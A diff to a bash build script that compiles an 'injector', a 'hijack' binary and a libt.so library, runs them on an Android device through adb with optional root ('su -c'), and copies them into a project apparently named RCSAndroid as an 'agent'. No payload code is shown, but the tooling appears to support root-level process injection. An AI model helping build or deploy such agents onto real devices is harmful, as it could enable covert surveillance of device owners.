@@ -31,11 +31,17 @@ injector=`echo $injector | tr '[:upper:]' '[:lower:]'`
 echo -n "run on target? [y/N] press [ENTER]: "
 read run
 run=`echo $run | tr '[:upper:]' '[:lower:]'`
-echo -n "target has su [y/N] press [ENTER]: "
 if [[ "$run" == "y" ]]; then
+  echo -n "target has su [y/N] press [ENTER]: "
   read supresent
   supresent=`echo $supresent | tr '[:upper:]' '[:lower:]'`
 fi
+
+
+
+echo -n "copy in agent? [y/N] press [ENTER]: "
+read copy
+copy=`echo $copy | tr '[:upper:]' '[:lower:]'`
 
 if [[ "$debug" == "d" ||  "$debug" == "l" ]]; then
   echo "DEBUG MODE ON!"
@@ -67,7 +73,7 @@ if [[ $? -gt 0 ]]; then
   echo "ERROR! make"
   exit 1
 fi
-if [[ "$supresent" == "y" ]]; then
+if [[ "$run" == "y" && "$supresent" == "y" ]]; then
   export SUCMD="su -c"
 else
   export SUCMD=""
@@ -152,4 +158,13 @@ if [[ "$run" == "y" ]]; then
     adb shell $SUCMD 'fuser -k -s -9  /data/local/tmp/log'
     adb shell "$SUCMD tail -f  /data/local/tmp/log" > ./runoutput.log &
   fi
+fi
+
+if [[ "$copy" == "y" ]]; then
+  if [[ "$debug" == "d" ]]; then
+    cp libt_debug.so  /home/zad/work/devel/core-android/RCSAndroid/preprocess/libt.so
+  else
+    cp libt.so  /home/zad/work/devel/core-android/RCSAndroid/preprocess/libt.so
+  fi
+    cp hijack/obj/local/armeabi/hijack   /home/zad/work/devel/core-android/RCSAndroid/preprocess/ && cd /home/zad/work/devel/core-android/RCSAndroid && ant set-debug && cd -
 fi
